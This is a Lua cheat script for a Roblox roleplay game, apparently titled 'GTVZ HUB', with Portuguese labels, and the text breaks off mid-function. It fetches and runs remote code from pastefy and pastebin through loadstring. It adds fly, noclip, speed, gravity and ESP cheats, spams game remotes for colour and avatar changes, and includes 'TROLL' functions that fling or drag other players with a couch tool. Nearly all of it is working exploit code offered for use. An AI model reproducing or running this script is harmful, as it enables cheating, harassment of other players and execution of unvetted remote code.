-- This file was leaked by S4turns Soc1ety - Gtvz You are Skidder

local genv = getgenv()

 s = Instance.new("Sky")
		s.Name = "Sky"
		s.Parent = game.Lighting
		s.SkyboxBk = "http://www.roblox.com/asset/?id=103778952050387"
		s.SkyboxDn = "http://www.roblox.com/asset/?id=103778952050387"
		s.SkyboxFt = "http://www.roblox.com/asset/?id=103778952050387"
		s.SkyboxLf = "http://www.roblox.com/asset/?id=103778952050387"
		s.SkyboxRt = "http://www.roblox.com/asset/?id=103778952050387"
		s.SkyboxUp = "http://www.roblox.com/asset/?id=103778952050387"
		
local Players = game:GetService("Players")
local RE = game:GetService("ReplicatedStorage"):WaitForChild("RE")
local remote = RE:FindFirstChild("1RPNam1eColo1r")

-- Lerp entre duas cores
local function lerpColor(c1, c2, t)
	return Color3.new(
		c1.R + (c2.R - c1.R) * t,
		c1.G + (c2.G - c1.G) * t,
		c1.B + (c2.B - c1.B) * t
	)
end

-- Função que aplica o RGB constantemente
local function startRGBLoop()
	task.spawn(function()
		local black = Color3.new(0, 0, 0)
		local green = Color3.fromRGB(0, 255, 0)

		while true do
			-- Preto  Verde
			for t = 0, 1, 0.02 do
				if remote then
					remote:FireServer("PickingRPBioColor", lerpColor(black, green, t))
				end
				task.wait(0.03)
			end
			-- Verde  Preto
			for t = 1, 0, -0.02 do
				if remote then
					remote:FireServer("PickingRPBioColor", lerpColor(black, green, t))
				end
				task.wait(0.03)
			end
		end
	end)
end

-- Inicia o loop uma vez
startRGBLoop()

-- Reinicia o loop ao respawnar
Players.LocalPlayer.CharacterAdded:Connect(function()
	-- Espera um pouco após spawn
	task.wait(1)
	startRGBLoop()
end)
wait(0.4)

local args = {

    [1] = "RolePlayBio",
    [2] = "CARREGANDO SCRIPT"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
wait(5)

local args = {
    [1] = "RolePlayBio",
    [2] = "USE : GTVZ HUB"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
wait(2.0)
local Libary = loadstring(game:HttpGet("https://pastefy.app/SibplqH8/raw"))()

workspace.FallenPartsDestroyHeight = -math.huge

local Window = Libary:MakeWindow({
    Title = "GTVZ HUB",
    SubTitle = "YT : GT_MINGUI",
    LoadText = "GTVZ HUB",
    Flags = "GTVZ HUB"
})

Window:AddMinimizeButton({
    Button = { Image = "rbxassetid://17628296195", BackgroundTransparency = 0 },
    Corner = { CornerRadius = UDim.new(35, 1) },
})

local Tabstatus = Window:MakeTab({ Title = "STATUS", Icon = "rbxassetid://10723415903" })
local InfoTab = Window:MakeTab({ Title = "INFO", Icon = "rbxassetid://10709790387" })
local Tabjogado = Window:MakeTab({"JOGADOR", "user"})
local Tabprici = Window:MakeTab({ "AVATA", "rbxassetid://10734952036" })
local Troll = Window:MakeTab({ Title = "TROLL", Icon = "rbxassetid://131153193945220" })
local protec = Window:MakeTab({ Title = "ANTI", Icon = "rbxassetid://11322093465" })
local Tabcasa = Window:MakeTab({"CASA", "home"})
local Tab = Window:MakeTab({"TELEPORT", "tp"})
local Tabmusic = Window:MakeTab({"TROLL AUDIO", "music"})
local CarTab = Window:MakeTab({"VEÍCULO", "car"})
local Tabconfg = Window:MakeTab({ Title = "CONFIG", Icon = "settings" })
----------------------------------------------------------------

Tabstatus:AddSection({ Name = "STATUS" })

local startTime = tick()

local playTimeParagraph = Tabstatus:AddParagraph({"TEMPO JOGANDO", "0s"})

task.spawn(function()
    while true do
        task.wait(1)
        local elapsed = math.floor(tick() - startTime)
        local minutes = math.floor(elapsed / 60)
        local seconds = elapsed % 60
        local displayText = string.format("%02dmin %02ds", minutes, seconds)
        playTimeParagraph:SetDesc(displayText)
    end
end)

local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

Tabstatus:AddParagraph({"JOGO", gameName})

Tabstatus:AddParagraph({"MÁXIMO NO SERVIDOR", tostring(game.Players.MaxPlayers)})

local currentPlayersParagraph = Tabstatus:AddParagraph({"JOGADORES", tostring(#game.Players:GetPlayers())})

-- Atualiza quantidade de jogadores em tempo real
task.spawn(function()
    while true do
        task.wait(1)
        local playerCount = #game.Players:GetPlayers()
        currentPlayersParagraph:SetDesc(tostring(playerCount))
    end
end)

local UserInputService = game:GetService("UserInputService")

local function getDeviceType()
    local platform = UserInputService:GetPlatform()

    if platform == Enum.Platform.Windows then
        return "DISPOSITIVO : WINDOWS"
    elseif platform == Enum.Platform.OSX then
        return "DISPOSITIVO : MACBOOK"
    elseif platform == Enum.Platform.XBoxOne then
        return "DISPOSITIVO : XBOX"
    elseif platform == Enum.Platform.IOS or platform == Enum.Platform.Android then
        if UserInputService.KeyboardEnabled or UserInputService.MouseEnabled then
            return "DISPOSITIVO : TABLET"
        else
            return "DISPOSITIVO : CELULAR"
        end
    else
        return "DISPOSITIVO : DESCONHECIDO"
    end
end

Tabstatus:AddParagraph({"DISPOSITIVO", getDeviceType()})

local executor = identifyexecutor and identifyexecutor() or "Executor Desconhecido"
warn("Executor detectado: " .. executor)

Tabstatus:AddParagraph({"EXECUTOR", executor})

Tabstatus:AddSection({ Name = "CONFIG" })

Tabstatus:AddButton({
    Name = "RECONECTAR",
    Callback = function()
        local TeleportService = game:GetService("TeleportService")

TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
    end,
})

Tabstatus:AddButton({
    Name = "IR PRA SERVER CHEIO",
    Callback = function()
        local Http = game:GetService("HttpService")
local TPS = game:GetService("TeleportService")
local Players = game:GetService("Players")

local PlaceId = game.PlaceId
local Api = "https://games.roblox.com/v1/games/"..PlaceId.."/servers/Public?sortOrder=Desc&limit=100"

local function FindServer()
    local cursor = nil
    repeat
        local url = Api .. (cursor and "&cursor="..cursor or "")
        local data = Http:JSONDecode(game:HttpGet(url))
        for _, server in pairs(data.data) do
            if server.playing < server.maxPlayers and server.playing >= 21 then
                return server.id
            end
        end
        cursor = data.nextPageCursor
    until not cursor
end

local serverId = FindServer()
if serverId then
    TPS:TeleportToPlaceInstance(PlaceId, serverId, Players.LocalPlayer)
else
    warn("AGUARDE ACHAR SERVIDOR CHEIO.")
end
    end,
})

Tabstatus:AddButton({
    Name = "MUDA DE SERVER",
    Callback = function()
        local Http = game:GetService("HttpService")
local TPS = game:GetService("TeleportService")
local Api = "https://games.roblox.com/v1/games/"

local _place = game.PlaceId
local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
function ListServers(cursor)
  local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
  return Http:JSONDecode(Raw)
end

local Server, Next; repeat
  local Servers = ListServers(Next)
  Server = Servers.data[1]
  Next = Servers.nextPageCursor
until Server

TPS:TeleportToPlaceInstance(_place,Server.id,game.Players.LocalPlayer)
    end,
})
----------------------------------------------------------------

InfoTab:AddDiscordInvite({
    Name = "GTVZ HUB",
    Description = "DISCORD GTVZ HUB",
    Logo = "rbxassetid://17628296195",
    Invite = "https://discord.gg/SXtfYJSPny",
})

InfoTab:AddParagraph({"DESENVOLVENDO : GTVZ MODDED", })

InfoTab:AddParagraph({"EQUIPE : GTXMIX",})
----------------------------------------------------------------

local Section = Tabjogado:AddSection({
    Name = "JOGADOR"
})

Tabjogado:AddButton({
    Name = "FLY JOGADO",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/QjjQvMsE"))()
    end
})


local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer
local connection = nil
local running = false

-- Variáveis para armazenar os valores atuais
local currentWalkSpeed = 16
local currentJumpPower = 50
local currentGravity = 196.2

-- Função para aplicar noclip
local function ativarNoclip()
    if running then return end
    running = true
    connection = RunService.Stepped:Connect(function()
        if not running or not player.Character then return end
        for _, v in pairs(player.Character:GetDescendants()) do
            if v:IsA("BasePart") then
                v.CanCollide = false
            end
        end
    end)
end

-- Função para desativar noclip
local function desativarNoclip()
    running = false
    if connection then
        connection:Disconnect()
        connection = nil
    end
end

-- Função para obter o Humanoid com segurança
local function getHumanoid()
    if player.Character and player.Character:FindFirstChild("Humanoid") then
        return player.Character.Humanoid
    end
    return nil
end

-- Função para restaurar todos os valores no novo personagem
local function onCharacterAdded(character)
    -- Aguarda o Humanoid carregar
    local humanoid = character:WaitForChild("Humanoid", 5)
    if humanoid then
        humanoid.WalkSpeed = currentWalkSpeed
        humanoid.UseJumpPower = true
        humanoid.JumpPower = currentJumpPower
    end
end

-- Reconecta quando o personagem respawna
player.CharacterAdded:Connect(onCharacterAdded)

-- Aplica valores iniciais se o personagem já existir
if player.Character then
    onCharacterAdded(player.Character)
end

-- Toggle do Noclip
Tabjogado:AddToggle({
    Name = "ATRAVESSAR PAREDE",
    Callback = function(value)
        if value then
            ativarNoclip()
        else
            desativarNoclip()
        end
    end
})

-- Velocidade do jogador
Tabjogado:AddTextBox({
    Name = "VELOCIDADE JOGADOR",
    PlaceholderText = "DIGITE A VELOCIDADE",
    Callback = function(value)
        local speed = tonumber(value)
        if speed then
            currentWalkSpeed = speed
            local humanoid = getHumanoid()
            if humanoid then
                humanoid.WalkSpeed = speed
            end
        else
            warn("Velocidade inválida!")
        end
    end
})

-- Resetar velocidade
Tabjogado:AddButton({
    Name = "RESETAR VELOCIDADE",
    Callback = function()
        currentWalkSpeed = 16
        local humanoid = getHumanoid()
        if humanoid then
            humanoid.WalkSpeed = 16
        end
    end
})

-- Altura do pulo
Tabjogado:AddTextBox({
    Name = "ALTURA DO PULO",
    PlaceholderText = "DIGITE ALTURA PULO",
    Callback = function(value)
        local jumpPower = tonumber(value)
        if jumpPower then
            currentJumpPower = jumpPower
            local humanoid = getHumanoid()
            if humanoid then
                humanoid.UseJumpPower = true
                humanoid.JumpPower = jumpPower
            end
        else
            warn("Altura de pulo inválida!")
        end
    end
})

-- Resetar pulo
Tabjogado:AddButton({
    Name = "RESETAR PULO",
    Callback = function()
        currentJumpPower = 50
        local humanoid = getHumanoid()
        if humanoid then
            humanoid.UseJumpPower = true
            humanoid.JumpPower = 50
        end
    end
})

-- Gravidade
Tabjogado:AddTextBox({
    Name = "GRAVIDADE",
    PlaceholderText = "DIGITE GRAVIDADE",
    Callback = function(value)
        local gravity = tonumber(value)
        if gravity then
            currentGravity = gravity
            workspace.Gravity = gravity
        else
            warn("Gravidade inválida!")
        end
    end
})

-- Resetar gravidade
Tabjogado:AddButton({
    Name = "RESETAR GRAVIDADE",
    Callback = function()
        currentGravity = 196.2
        workspace.Gravity = 196.2
    end
})

Tabjogado:AddSection({ Name = "ESP JOGADOR" })


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local espRunning = false
local espConnection

local function updatePlayerESP()
    local localCharacter = LocalPlayer.Character
    if not localCharacter or not localCharacter:FindFirstChild("Head") then return end

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
            local head = player.Character.Head
            local distance = (localCharacter.Head.Position - head.Position).Magnitude

            local billboardGui = head:FindFirstChild("TadachiisESPTags")
            if not billboardGui then
                billboardGui = Instance.new("BillboardGui")
                billboardGui.Name = "TadachiisESPTags"
                billboardGui.Adornee = head
                billboardGui.Size = UDim2.new(0, 100, 0, 50)
                billboardGui.StudsOffset = Vector3.new(0, 2, 0)
                billboardGui.AlwaysOnTop = true
                billboardGui.LightInfluence = 1
                billboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                billboardGui.Parent = head

                local textLabel = Instance.new("TextLabel")
                textLabel.Name = "NameLabel"
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.BackgroundTransparency = 1
                textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
                textLabel.TextStrokeTransparency = 0
                textLabel.TextScaled = true
                textLabel.Text = player.Name .. "\nDistance: " .. math.floor(distance)
                textLabel.Parent = billboardGui
            else
                local label = billboardGui:FindFirstChild("NameLabel")
                if label then
                    label.Text = player.Name .. "\nDistance: " .. math.floor(distance)
                end
            end
        end
    end
end

local function enableESP()
    if not espRunning then
        espConnection = RunService.Heartbeat:Connect(updatePlayerESP)
        espRunning = true
        print("ESP ativado.")
    end
end

local function disableESP()
    if espConnection then
        espConnection:Disconnect()
        espConnection = nil
    end
    espRunning = false

    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("Head") then
            local tag = player.Character.Head:FindFirstChild("TadachiisESPTags")
            if tag then
                tag:Destroy()
            end
        end
    end

    print("ESP desativado.")
end

-- Toggle no Tabjogado
Tabjogado:AddToggle({
    Name = "ESP NOME DISTANCIA",
    Default = false,
    Callback = function(state)
        if state then
            enableESP()
        else
            disableESP()
        end
    end
})





local FillColor = Color3.fromRGB(0,255,0)
local DepthMode = "AlwaysOnTop"
local FillTransparency = 0.5
local OutlineColor = Color3.fromRGB(0,0,0)
local OutlineTransparency = 0

local CoreGui = game:FindService("CoreGui")
local Players = game:FindService("Players")
local lp = Players.LocalPlayer
local connections = {}
local Storage = nil

local function EnableESP()
    if Storage then return end -- já ativado

    Storage = Instance.new("Folder")
    Storage.Parent = CoreGui
    Storage.Name = "Highlight_Storage"

    local function Highlight(plr)
        if plr == lp then return end -- ignora o próprio jogador

        local highlight = Instance.new("Highlight")
        highlight.Name = plr.Name
        highlight.FillColor = FillColor
        highlight.DepthMode = Enum.HighlightDepthMode[DepthMode]
        highlight.FillTransparency = FillTransparency
        highlight.OutlineColor = OutlineColor
        highlight.OutlineTransparency = OutlineTransparency
        highlight.Parent = Storage

        local plrchar = plr.Character
        if plrchar then
            highlight.Adornee = plrchar
        end

        connections[plr] = plr.CharacterAdded:Connect(function(char)
            highlight.Adornee = char
        end)
    end

    connections["_PlayerAdded"] = Players.PlayerAdded:Connect(Highlight)

    for _, v in pairs(Players:GetPlayers()) do
        Highlight(v)
    end

    print("ESP Highlight ativado.")
end

local function DisableESP()
    if Storage then
        Storage:Destroy()
        Storage = nil
    end

    for _, conn in pairs(connections) do
        if conn and conn.Disconnect then
            conn:Disconnect()
        end
    end
    connections = {}

    print("ESP Highlight desativado.")
end

-- Toggle no Tabjogado
Tabjogado:AddToggle({
    Name = "ESP HOLOGRAMA",
    Default = false,
    Callback = function(state)
        if state then
            EnableESP()
        else
            DisableESP()
        end
    end
})

-------------------------PRICIPAL---------------------------------------

Tabprici:AddSection({ Name = "PRINCIPAL" })

Tabprici:AddToggle({
    Name = "NOME RGB",
    Default = false,
    Callback = function(value)
        if value then
            startRGBLoop()
        else
            stopRGBLoop()
        end
    end
})

-- Serviços
local Players = game:GetService("Players")
local RE = game:GetService("ReplicatedStorage"):WaitForChild("RE")
local remote = RE:FindFirstChild("1RPNam1eColo1r")

-- Função para interpolar entre duas cores
local function lerpColor(c1, c2, t)
	return Color3.new(
		c1.R + (c2.R - c1.R) * t,
		c1.G + (c2.G - c1.G) * t,
		c1.B + (c2.B - c1.B) * t
	)
end

-- Paleta RGB + cores gama
local colorList = {
	Color3.fromRGB(255, 0, 0),
	Color3.fromRGB(255, 102, 0),
	Color3.fromRGB(255, 255, 0),
	Color3.fromRGB(0, 255, 0),
	Color3.fromRGB(0, 255, 255),
	Color3.fromRGB(0, 102, 255),
	Color3.fromRGB(153, 0, 255),
	Color3.fromRGB(255, 0, 255),
	Color3.fromRGB(255, 105, 180),
	Color3.fromRGB(255, 215, 0),
	Color3.fromRGB(0, 255, 127),
	Color3.fromRGB(135, 206, 250),
	Color3.fromRGB(255, 51, 153),
	Color3.fromRGB(102, 255, 178),
	Color3.fromRGB(204, 153, 255)
}

-- Controle do loop RGB
local loopRunning = false
local rgbThread = nil

-- Início da animação RGB com transição suave
function startRGBLoop()
	if loopRunning then return end
	loopRunning = true
	rgbThread = task.spawn(function()
		while loopRunning do
			for i = 1, #colorList do
				local c1 = colorList[i]
				local c2 = colorList[i % #colorList + 1]
				for t = 0, 1, 0.02 do
					if not loopRunning then return end
					if remote then
						remote:FireServer("PickingRPNameColor", lerpColor(c1, c2, t))
					end
					task.wait(0.02)
				end
			end
		end
	end)
end

-- Parar animação RGB
function stopRGBLoop()
	loopRunning = false
end


Tabprici:AddToggle({
    Name = "CORPO RGB",
    Default = false,
    Callback = function(value)
        if value then
            startRGBCharacter()
        else
            stopRGBCharacter()
        end
    end
})

-- Lista de cores RGB para o corpo
local bodyColors = {
    "Bright red",
    "Lime green",
    "Bright blue",
    "Bright yellow",
    "Bright cyan",
    "Hot pink",
    "Royal purple"
}

local bodyLoopRunning = false
local rgbBodyThread = nil

local function changeBodyColor(color)
    local args = { color }
    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeBodyColor"):FireServer(unpack(args))
end

function startRGBCharacter()
    if bodyLoopRunning then return end
    bodyLoopRunning = true
    rgbBodyThread = task.spawn(function()
        while bodyLoopRunning do
            for _, color in ipairs(bodyColors) do
                if not bodyLoopRunning then return end
                changeBodyColor(color)
                task.wait(0.5)
            end
        end
    end)
end

function stopRGBCharacter()
    bodyLoopRunning = false
end


local hairColors = {
    Color3.new(1, 1, 0), Color3.new(0, 0, 1), Color3.new(1, 0, 1), Color3.new(1, 1, 1),
    Color3.new(0, 1, 0), Color3.new(0.5, 0, 1), Color3.new(1, 0.647, 0), Color3.new(0, 1, 1)
}
local isActive = false


local function changeHairColor()
    local i = 1
    while isActive do
        if not isActive then break end
        local args = { [1] = "ChangeHairColor2", [2] = hairColors[i] }
        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Max1y"):FireServer(unpack(args))
        wait(0.1)
        i = i % #hairColors + 1
    end
end


Tabprici:AddToggle({
    Name = "CABELO RGB",
    Default = false,
    Callback = function(value)
        isActive = value
        if isActive then
            changeHairColor()
        end
    end
})


local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = ReplicatedStorage:WaitForChild("Remotes")

local Target = nil

local function GetPlayerNames()
    local PlayerNames = {}
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(PlayerNames, player.Name)
    end
    return PlayerNames
end

local Dropdown = Tabprici:AddDropdown({
    Name = "SELECIONAR JOGADOR",
    Options = GetPlayerNames(),
    Default = Target,
    Callback = function(Value)
        Target = Value
    end
})

-- // Atualizar Dropdown dinamicamente
local function UpdateDropdown()
    Dropdown:Refresh(GetPlayerNames(), true)
end

Players.PlayerAdded:Connect(UpdateDropdown)
Players.PlayerRemoving:Connect(UpdateDropdown)

-- // Botão: Copiar Avatar
Tabprici:AddButton({
    Name = "COPIAR AVATAR",
    Callback = function()
        if not Target then return end

        local LP = Players.LocalPlayer
        local LChar = LP.Character
        local TPlayer = Players:FindFirstChild(Target)

        if not (TPlayer and TPlayer.Character) then return end

        local LHumanoid = LChar and LChar:FindFirstChildOfClass("Humanoid")
        local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")

        if not (LHumanoid and THumanoid) then return end

        
        local LDesc = LHumanoid:GetAppliedDescription()

        for _, acc in ipairs(LDesc:GetAccessories(true)) do
            if acc.AssetId and tonumber(acc.AssetId) then
                Remotes.Wear:InvokeServer(tonumber(acc.AssetId))
                task.wait(0.2)
            end
        end

        if tonumber(LDesc.Shirt) then
            Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt))
            task.wait(0.2)
        end

        if tonumber(LDesc.Pants) then
            Remotes.Wear:InvokeServer(tonumber(LDesc.Pants))
            task.wait(0.2)
        end

        if tonumber(LDesc.Face) then
            Remotes.Wear:InvokeServer(tonumber(LDesc.Face))
            task.wait(0.2)
        end

        -- // Copiar do jogador selecionado
        local PDesc = THumanoid:GetAppliedDescription()

        -- Trocar corpo
        local argsBody = {
            [1] = {
                [1] = PDesc.Torso,
                [2] = PDesc.RightArm,
                [3] = PDesc.LeftArm,
                [4] = PDesc.RightLeg,
                [5] = PDesc.LeftLeg,
                [6] = PDesc.Head
            }
        }
        Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))
        task.wait(0.5)

        -- Aplicar roupas e face
        if tonumber(PDesc.Shirt) then
            Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))
            task.wait(0.3)
        end

        if tonumber(PDesc.Pants) then
            Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))
            task.wait(0.3)
        end

        if tonumber(PDesc.Face) then
            Remotes.Wear:InvokeServer(tonumber(PDesc.Face))
            task.wait(0.3)
        end

        -- Aplicar acessórios
        for _, acc in ipairs(PDesc:GetAccessories(true)) do
            if acc.AssetId and tonumber(acc.AssetId) then
                Remotes.Wear:InvokeServer(tonumber(acc.AssetId))
                task.wait(0.3)
            end
        end

        -- Copiar cor de pele
        local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
        if SkinColor then
            Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
            task.wait(0.3)
        end

        -- Copiar animação (Idle)
        if tonumber(PDesc.IdleAnimation) then
            Remotes.Wear:InvokeServer(tonumber(PDesc.IdleAnimation))
            task.wait(0.3)
        end
    end
})





-----------------------=TROLL=---------------------------------------

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")
local RunService = game:GetService("RunService")
local cam = workspace.CurrentCamera


local selectedPlayerName = nil
local methodKill = nil
getgenv().Target = nil
local Character = LocalPlayer.Character
local Humanoid = Character and Character:WaitForChild("Humanoid")
local RootPart = Character and Character:WaitForChild("HumanoidRootPart")

-- Função para limpar o sofá (couch)
local function cleanupCouch()
    local char = LocalPlayer.Character
    if char then
        local couch = char:FindFirstChild("Chaos.Couch") or LocalPlayer.Backpack:FindFirstChild("Chaos.Couch")
        if couch then
            couch:Destroy()
        end
    end
    -- Limpar ferramentas via remoto
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
end

-- Conectar evento CharacterAdded
LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    Character = newCharacter
    Humanoid = newCharacter:WaitForChild("Humanoid")
    RootPart = newCharacter:WaitForChild("HumanoidRootPart")
    cleanupCouch()
    
    -- Conectar evento Died para o novo Humanoid
    Humanoid.Died:Connect(function()
        cleanupCouch()
    end)
end)

-- Conectar evento Died para o Humanoid inicial, se existir
if Humanoid then
    Humanoid.Died:Connect(function()
        cleanupCouch()
    end)
end

-- Função KillPlayerCouch
local function KillPlayerCouch()
    if not selectedPlayerName then
        warn("Erro: Nenhum jogador selecionado")
        return
    end
    local target = Players:FindFirstChild(selectedPlayerName)
    if not target or not target.Character then
        warn("Erro: Jogador alvo não encontrado ou sem personagem")
        return
    end

    local char = LocalPlayer.Character
    if not char then
        warn("Erro: Personagem do jogador local não encontrado")
        return
    end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if not hum or not root or not tRoot then
        warn("Erro: Componentes necessários não encontrados")
        return
    end

    local originalPos = root.Position 
    local sitPos = Vector3.new(145.51, -350.09, 21.58)

    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
    task.wait(0.2)

    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
    task.wait(0.3)

    local tool = LocalPlayer.Backpack:FindFirstChild("Couch")
    if tool then tool.Parent = char end
    task.wait(0.1)

    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)
    task.wait(0.1)

    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    hum.PlatformStand = false
    cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot or hum

    local align = Instance.new("BodyPosition")
    align.Name = "BringPosition"
    align.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    align.D = 10
    align.P = 30000
    align.Position = root.Position
    align.Parent = tRoot

    task.spawn(function()
        local angle = 0
        local startTime = tick()
        while tick() - startTime < 5 and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do
            local tHum = target.Character:FindFirstChildOfClass("Humanoid")
            if not tHum or tHum.Sit then break end

            local hrp = target.Character.HumanoidRootPart
            local adjustedPos = hrp.Position + (hrp.Velocity / 1.5)

            angle += 50
            root.CFrame = CFrame.new(adjustedPos + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(angle), 0, 0)
            align.Position = root.Position + Vector3.new(2, 0, 0)

            task.wait()
        end

        align:Destroy()
        hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        hum.PlatformStand = false
        cam.CameraSubject = hum

        for _, p in pairs(char:GetDescendants()) do
            if p:IsA("BasePart") then
                p.Velocity = Vector3.zero
                p.RotVelocity = Vector3.zero
            end
        end

        task.wait(0.1)
        root.CFrame = CFrame.new(sitPos)
        task.wait(0.3)

        local tool = char:FindFirstChild("Couch")
        if tool then tool.Parent = LocalPlayer.Backpack end

        task.wait(0.01)
        ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
        task.wait(0.2)
        root.CFrame = CFrame.new(originalPos)
    end)
end

-- Função BringPlayerLLL
local function BringPlayerLLL()
    if not selectedPlayerName then
        warn("Erro: Nenhum jogador selecionado")
        return
    end
    local target = Players:FindFirstChild(selectedPlayerName)
    if not target or not target.Character then
        warn("Erro: Jogador alvo não encontrado ou sem personagem")
        return
    end

    local char = LocalPlayer.Character
    if not char then
        warn("Erro: Personagem do jogador local não encontrado")
        return
    end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if not hum or not root or not tRoot then
        warn("Erro: Componentes necessários não encontrados")
        return
    end

    local originalPos = root.Position 
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
    task.wait(0.2)

    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
    task.wait(0.3)

    local tool = LocalPlayer.Backpack:FindFirstChild("Couch")
    if tool then
        tool.Parent = char
    end
    task.wait(0.1)

    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)
    task.wait(0.1)

    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    hum.PlatformStand = false
    cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot or hum

    local align = Instance.new("BodyPosition")
    align.Name = "BringPosition"
    align.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    align.D = 10
    align.P = 30000
    align.Position = root.Position
    align.Parent = tRoot

    task.spawn(function()
        local angle = 0
        local startTime = tick()
        while tick() - startTime < 5 and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do
            local tHum = target.Character:FindFirstChildOfClass("Humanoid")
            if not tHum or tHum.Sit then break end

            local hrp = target.Character.HumanoidRootPart
            local adjustedPos = hrp.Position + (hrp.Velocity / 1.5)

            angle += 50
            root.CFrame = CFrame.new(adjustedPos + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(angle), 0, 0)
            align.Position = root.Position + Vector3.new(2, 0, 0)

            task.wait()
        end

        align:Destroy()
        hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        hum.PlatformStand = false
        cam.CameraSubject = hum

        for _, p in pairs(char:GetDescendants()) do
            if p:IsA("BasePart") then
                p.Velocity = Vector3.zero
                p.RotVelocity = Vector3.zero
            end
        end

        task.wait(0.1)
        root.Anchored = true
        root.CFrame = CFrame.new(originalPos)
        task.wait(0.001)
        root.Anchored = false

        task.wait(0.7)
        local tool = char:FindFirstChild("Couch")
        if tool then
            tool.Parent = LocalPlayer.Backpack
        end

        task.wait(0.001)
        ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
    end)
end

-- Função BringWithCouch
local function BringWithCouch()
    local targetPlayer = Players:FindFirstChild(getgenv().Target)
    if not targetPlayer then
        warn("Erro: Nenhum jogador alvo selecionado")
        return
    end
    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        warn("Erro: Jogador alvo sem personagem ou HumanoidRootPart")
        return
    end

    local args = { [1] = "ClearAllTools" }
    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer(unpack(args))
    local args = { [1] = "PickingTools", [2] = "Couch" }
    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

    local couch = LocalPlayer.Backpack:WaitForChild("Couch", 2)
    if not couch then
        warn("Erro: Sofá não encontrado no Backpack")
        return
    end

    couch.Name = "Chaos.Couch"
    local seat1 = couch:FindFirstChild("Seat1")
    local seat2 = couch:FindFirstChild("Seat2")
    local handle = couch:FindFirstChild("Handle")
    if seat1 and seat2 and handle then
        seat1.Disabled = true
        seat2.Disabled = true
        handle.Name = "Handle "
    else
        warn("Erro: Componentes do sofá não encontrados")
        return
    end
    couch.Parent = LocalPlayer.Character

    local tet = Instance.new("BodyVelocity", seat1)
    tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    tet.P = 1250
    tet.Velocity = Vector3.new(0, 0, 0)
    tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

    repeat
        for m = 1, 35 do
            local pos = { x = 0, y = 0, z = 0 }
            local tRoot = targetPlayer.Character and targetPlayer.Character.HumanoidRootPart
            if not tRoot then break end
            pos.x = tRoot.Position.X + (tRoot.Velocity.X / 2)
            pos.y = tRoot.Position.Y + (tRoot.Velocity.Y / 2)
            pos.z = tRoot.Position.Z + (tRoot.Velocity.Z / 2)
